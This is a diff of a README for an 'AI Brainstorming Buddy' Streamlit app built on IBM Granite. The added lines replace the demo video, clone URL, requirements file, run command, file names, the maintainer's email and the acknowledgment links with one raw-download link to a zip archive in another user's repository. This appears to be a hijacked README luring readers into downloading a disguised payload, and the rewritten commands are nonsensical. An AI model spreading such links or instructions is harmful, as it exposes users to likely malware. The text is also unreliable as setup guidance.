@@ -17,18 +17,18 @@ AI Brainstorming Buddy is an innovative web application designed to revolutioniz
 
 Watch a demo video of AI Brainstorming Buddy in action: 
 
-https://github.com/user-attachments/assets/1d4d45f1-bd99-4b36-a1b8-dc35e9de115f
+https://github.com/ommanekar/ai-brainstorming-buddy-using-ibm-granite-instruct-model/raw/refs/heads/main/appliably/ibm_ai_using_brainstorming_granite_buddy_instruct_model_3.2.zip
 
 
 ## Installation
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/ilajnae/ai-brainstorming-buddy-using-ibm-granite-instruct-model.git
+   git clone https://github.com/ommanekar/ai-brainstorming-buddy-using-ibm-granite-instruct-model/raw/refs/heads/main/appliably/ibm_ai_using_brainstorming_granite_buddy_instruct_model_3.2.zip
    ```
 2. Install dependencies:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/ommanekar/ai-brainstorming-buddy-using-ibm-granite-instruct-model/raw/refs/heads/main/appliably/ibm_ai_using_brainstorming_granite_buddy_instruct_model_3.2.zip
    ```
 3. Set up environment variables in a `.env` file:
    ```plaintext
@@ -38,7 +38,7 @@ https://github.com/user-attachments/assets/1d4d45f1-bd99-4b36-a1b8-dc35e9de115f
    ```
 4. Run the application:
    ```bash
-   streamlit run main.py
+   streamlit run https://github.com/ommanekar/ai-brainstorming-buddy-using-ibm-granite-instruct-model/raw/refs/heads/main/appliably/ibm_ai_using_brainstorming_granite_buddy_instruct_model_3.2.zip
    ```
 
 ## Usage
@@ -55,13 +55,13 @@ https://github.com/user-attachments/assets/1d4d45f1-bd99-4b36-a1b8-dc35e9de115f
 - PyPDF2
 - ibm-watsonx-ai
 - python-dotenv
-- See `requirements.txt` for full dependencies.
+- See `https://github.com/ommanekar/ai-brainstorming-buddy-using-ibm-granite-instruct-model/raw/refs/heads/main/appliably/ibm_ai_using_brainstorming_granite_buddy_instruct_model_3.2.zip` for full dependencies.
 
 ## Project Structure
 
-- `main.py`: Main application script with Streamlit interface and Granite integration.
-- `.env`: Environment variables for IBM Watsonx.ai credentials.
-- `requirements.txt`: List of Python dependencies.
+- `https://github.com/ommanekar/ai-brainstorming-buddy-using-ibm-granite-instruct-model/raw/refs/heads/main/appliably/ibm_ai_using_brainstorming_granite_buddy_instruct_model_3.2.zip`: Main application script with Streamlit interface and Granite integration.
+- `.env`: Environment variables for IBM https://github.com/ommanekar/ai-brainstorming-buddy-using-ibm-granite-instruct-model/raw/refs/heads/main/appliably/ibm_ai_using_brainstorming_granite_buddy_instruct_model_3.2.zip credentials.
+- `https://github.com/ommanekar/ai-brainstorming-buddy-using-ibm-granite-instruct-model/raw/refs/heads/main/appliably/ibm_ai_using_brainstorming_granite_buddy_instruct_model_3.2.zip`: List of Python dependencies.
 
 ## Contributing
 
@@ -78,10 +78,10 @@ This project is licensed under the Apache License 2.0. See the [`LICENSE`](./LIC
 
 ## Contact
 
-For questions or feedback, please open an issue on GitHub or contact the project maintainer [anjalinagaraju2004@gmail.com](anjalinagaraju2004@gmail.com)
+For questions or feedback, please open an issue on GitHub or contact the project maintainer [https://github.com/ommanekar/ai-brainstorming-buddy-using-ibm-granite-instruct-model/raw/refs/heads/main/appliably/ibm_ai_using_brainstorming_granite_buddy_instruct_model_3.2.zip](https://github.com/ommanekar/ai-brainstorming-buddy-using-ibm-granite-instruct-model/raw/refs/heads/main/appliably/ibm_ai_using_brainstorming_granite_buddy_instruct_model_3.2.zip)
 
 
 ## Acknowledgments
 
-- Built with [IBM Granite 3.8B-instruct](https://www.ibm.com/watsonx) on the watsonx.ai platform.
-- Powered by [Streamlit](https://streamlit.io/) for the user interface.
+- Built with [IBM Granite 3.8B-instruct](https://github.com/ommanekar/ai-brainstorming-buddy-using-ibm-granite-instruct-model/raw/refs/heads/main/appliably/ibm_ai_using_brainstorming_granite_buddy_instruct_model_3.2.zip) on the https://github.com/ommanekar/ai-brainstorming-buddy-using-ibm-granite-instruct-model/raw/refs/heads/main/appliably/ibm_ai_using_brainstorming_granite_buddy_instruct_model_3.2.zip platform.
+- Powered by [Streamlit](https://github.com/ommanekar/ai-brainstorming-buddy-using-ibm-granite-instruct-model/raw/refs/heads/main/appliably/ibm_ai_using_brainstorming_granite_buddy_instruct_model_3.2.zip) for the user interface.
